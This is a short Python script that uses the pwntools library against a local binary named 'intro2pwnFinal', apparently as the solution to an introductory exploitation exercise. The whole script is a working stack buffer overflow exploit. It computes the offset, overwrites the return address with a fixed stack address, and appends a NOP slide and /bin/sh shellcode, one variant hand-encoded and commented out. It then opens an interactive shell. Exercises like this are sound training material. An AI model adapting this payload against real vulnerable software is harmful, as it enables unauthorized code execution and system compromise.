from pwn import *
pad = cyclic(cyclic_find(0x61616174))
eip = p32(0xffffd510+200)
nop_slide = "\x90"*1000
context.update(arch='i386', os='linux')
#shellcode = "jhh\x2f\x2f\x2fsh\x2fbin\x89\xe3jph\x01\x01\x01\x01\x814\x24ri\x01,1\xc9Qj\x07Y\x01\xe1Qj\x08Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"
shellcode =asm( shellcraft.sh())
payload = pad + eip + nop_slide + shellcode
print(hexdump(shellcode))
proc = process("./intro2pwnFinal")
proc.recvline()
proc.send(payload)
proc.interactive()
